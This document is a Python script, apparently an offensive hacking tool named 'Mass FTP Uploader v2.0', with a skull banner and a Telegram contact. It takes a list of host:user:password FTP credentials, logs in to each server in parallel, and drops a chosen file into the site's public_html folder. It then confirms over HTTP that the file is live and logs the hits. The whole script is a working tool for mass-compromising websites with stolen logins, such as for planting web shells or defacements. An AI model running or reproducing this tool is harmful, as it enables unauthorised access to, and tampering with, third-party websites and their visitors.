import ftplib
import os
import requests
import threading
from urllib.parse import urlparse
from colorama import Fore, Style, init

init(autoreset=True)

lock = threading.Lock()

# ========== CUSTOM BANNER ==========
BANNER = f"""
{Fore.RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡠⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{Fore.RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠟⠃⠀⠀⠙⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
{Fore.RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠋⠀⠀⠀⠀⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⠀⠀
{Fore.RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠾⢛⠒⠀⠀⠀⠀⠀⠀⠀⢸⡆⠀⠀⠀⠀⠀⠀⠀
{Fore.RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣶⣄⡈⠓⢄⠠⡀⠀⠀⠀⣄⣷⠀⠀⠀⠀⠀⠀⠀
{Fore.RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣷⠀⠈⠱⡄⠑⣌⠆⠀⠀⡜⢻⠀⠀⠀⠀⠀⠀⠀
{Fore.RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡿⠳⡆⠐⢿⣆⠈⢿⠀⠀⡇⠘⡆⠀⠀⠀⠀⠀⠀
{Fore.RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣷⡇⠀⠀⠈⢆⠈⠆⢸⠀⠀⢣⠀⠀⠀⠀⠀⠀
{Fore.RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣧⠀⠀⠈⢂⠀⡇⠀⠀⢨⠓⣄⠀⠀⠀⠀
{Fore.RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣦⣤⠖⡏⡸⠀⣀⡴⠋⠀⠈⠢⡀⠀⠀
{Fore.RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠁⣹⣿⣿⣿⣷⣾⠽⠖⠊⢹⣀⠄⠀⠀⠀⠈⢣⡀
{Fore.RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⣇⣰⢫⢻⢉⠉⠀⣿⡆⠀⠀⡸⡏⠀⠀⠀⠀⠀⠀⢇
{Fore.RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⡇⡇⠈⢸⢸⢸⠀⠀⡇⡇⠀⠀⠁⠻⡄⡠⠂⠀⠀⠀⠘
{Fore.RED}⢤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠛⠓⡇⠀⠸⡆⢸⠀⢠⣿⠀⠀⠀⠀⣰⣿⣵⡆⠀⠀⠀⠀
{Fore.RED}⠈⢻⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡿⣦⣀⡇⠀⢧⡇⠀⠀⢺⡟⠀⠀⠀⢰⠉⣰⠟⠊⣠⠂⠀⡸
{Fore.RED}⠀⠀⢻⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⢧⡙⠺⠿⡇⠀⠘⠇⠀⠀⢸⣧⠀⠀⢠⠃⣾⣌⠉⠩⠭⠍⣉⡇
{Fore.RED}⠀⠀⠀⠻⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣞⣋⠀⠈⠀⡳⣧⠀⠀⠀⠀⠀⢸⡏⠀⠀⡞⢰⠉⠉⠉⠉⠉⠓⢻⠃
{Fore.RED}⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⢀⣀⠠⠤⣤⣤⠤⠞⠓⢠⠈⡆⠀⢣⣸⣾⠆⠀⠀⠀⠀⠀⢀⣀⡼⠁⡿⠈⣉⣉⣒⡒⠢⡼⠀
{Fore.RED}⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣎⣽⣶⣤⡶⢋⣤⠃⣠⡦⢀⡼⢦⣾⡤⠚⣟⣁⣀⣀⣀⣀⠀⣀⣈⣀⣠⣾⣅⠀⠑⠂⠤⠌⣩⡇⠀
{Fore.RED}⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁⣺⢁⣞⣉⡴⠟⡀⠀⠀⠀⠁⠸⡅⠀⠈⢷⠈⠏⠙⠀⢹⡛⠀⢉⠀⠀⠀⣀⣀⣼⡇⠀
{Fore.RED}⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⡟⢡⠖⣡⡴⠂⣀⣀⣀⣰⣁⣀⣀⣸⠀⠀⠀⠀⠈⠁⠀⠀⠈⠀⣠⠜⠋⣠⠁⠀
{Fore.RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⡟⢿⣿⣿⣷⡟⢋⣥⣖⣉⠀⠈⢁⡀⠤⠚⠿⣷⡦⢀⣠⣀⠢⣄⣀⡠⠔⠋⠁⠀⣼⠃⠀⠀
{Fore.RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⡄⠈⠻⣿⣿⢿⣛⣩⠤⠒⠉⠁⠀⠀⠀⠀⠀⠉⠒⢤⡀⠉⠁⠀⠀⠀⠀⠀⢀⡿⠀⠀⠀
{Fore.RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣤⣤⠴⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠤⠀⠀⠀⠀⠀⢩⠇⠀⠀⠀
{Fore.RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{Fore.CYAN}╔══════════════════════════════════════════════════════════╗
{Fore.CYAN}║  {Fore.YELLOW}✪ Mass FTP Uploader v2.0                    {Fore.CYAN}║
{Fore.CYAN}║  {Fore.BLUE}✪ Telegram: @roothexh                        {Fore.CYAN}║
{Fore.CYAN}║  {Fore.RED}✪ Use at your own risk!                      {Fore.CYAN}║
{Fore.CYAN}╚══════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""

print(BANNER)

def strip_subdomain(domain):
    parts = domain.split('.')
    if len(parts) > 2:
        return '.'.join(parts[1:])
    return domain

def ftp_upload(host, user, passwd, filename, remote_name):
    try:
        ftp = ftplib.FTP()
        ftp.connect(host, 21, timeout=7)
        ftp.login(user, passwd)
        print(f"{Fore.GREEN}[+] Logged in to FTP: {host}")

        try:
            file_list = ftp.nlst()
        except:
            file_list = []
            
        if 'public_html' in file_list:
            ftp.cwd('public_html')
        else:
            print(f"{Fore.YELLOW}[!] No public_html found on {host}")
            ftp.quit()
            return False, None

        with open(filename, 'rb') as f:
            ftp.storbinary(f'STOR {remote_name}', f)

        ftp.quit()
        print(f"{Fore.GREEN}[+] Uploaded to FTP: {host}/public_html/{remote_name}")
        return True, f"{host}/public_html/{remote_name}"
    except Exception as e:
        print(f"{Fore.RED}[x] FTP Failed {host} - {e}")
        return False, None

def check_http_access(host, remote_name, marker):
    for domain_try in [host, strip_subdomain(host)]:
        url = f"http://{domain_try}/{remote_name}"
        try:
            r = requests.get(url, timeout=7)
            if r.status_code == 200 and marker in r.text:
                return url
        except:
            continue
    return None

def process_combo(combo, filename, remote_file_name):
    try:
        host, user, passwd = combo.strip().split(':')
    except ValueError:
        print(f"{Fore.RED}[!] Invalid format: {combo}")
        return

    # Read marker from file
    try:
        with open(filename, 'rb') as f:
            content = f.read(128)
            marker = content.decode('utf-8', errors='ignore').strip()[:64]
    except:
        marker = "FTPUploadMarker"

    uploaded, remote_path = ftp_upload(host, user, passwd, filename, remote_file_name)

    if uploaded:
        http_url = check_http_access(host, remote_file_name, marker)
        if http_url:
            print(f"{Fore.GREEN}[✓] Accessible at: {http_url}")
            with lock:
                with open('Successfully_Uploaded.txt', 'a') as f:
                    f.write(f"{http_url}\n")
        else:
            print(f"{Fore.YELLOW}[!] Uploaded but not accessible via web: {host}/{remote_file_name}")
            with lock:
                with open('Uploaded_But_Not_Accessible.txt', 'a') as f:
                    f.write(f"{host}:{user}:{passwd}\n")

def main():
    print(f"{Fore.CYAN}┌────────────────────────────────────────────────┐")
    print(f"{Fore.CYAN}│  {Fore.YELLOW}Enter the required information below          {Fore.CYAN}│")
    print(f"{Fore.CYAN}└────────────────────────────────────────────────┘{Style.RESET_ALL}")
    
    ftp_list = input(f"{Fore.GREEN}[?] {Fore.WHITE}Enter your FTP list [domain:username:password]: {Fore.YELLOW}").strip()
    file_to_upload = input(f"{Fore.GREEN}[?] {Fore.WHITE}Enter your file to upload: {Fore.YELLOW}").strip()
    remote_file_name = input(f"{Fore.GREEN}[?] {Fore.WHITE}Enter the name for the file on the server: {Fore.YELLOW}").strip()

    # Check if files exist
    if not os.path.exists(ftp_list):
        print(f"{Fore.RED}[!] FTP list file not found: {ftp_list}")
        return
    
    if not os.path.exists(file_to_upload):
        print(f"{Fore.RED}[!] File to upload not found: {file_to_upload}")
        return

    print(f"\n{Fore.CYAN}┌────────────────────────────────────────────────┐")
    print(f"{Fore.CYAN}│  {Fore.GREEN}Starting upload process...                     {Fore.CYAN}│")
    print(f"{Fore.CYAN}└────────────────────────────────────────────────┘{Style.RESET_ALL}\n")

    with open(ftp_list, 'r') as f:
        combos = [line.strip() for line in f if line.strip()]

    if not combos:
        print(f"{Fore.RED}[!] No valid FTP credentials found in the file")
        return

    threads = []
    for combo in combos:
        t = threading.Thread(target=process_combo, args=(combo, file_to_upload, remote_file_name))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    print(f"\n{Fore.GREEN}═══════════════════════════════════════════════════════════")
    print(f"{Fore.GREEN}✓ All threads completed!")
    print(f"{Fore.GREEN}✓ Check 'Successfully_Uploaded.txt' and 'Uploaded_But_Not_Accessible.txt'")
    print(f"{Fore.GREEN}═══════════════════════════════════════════════════════════{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
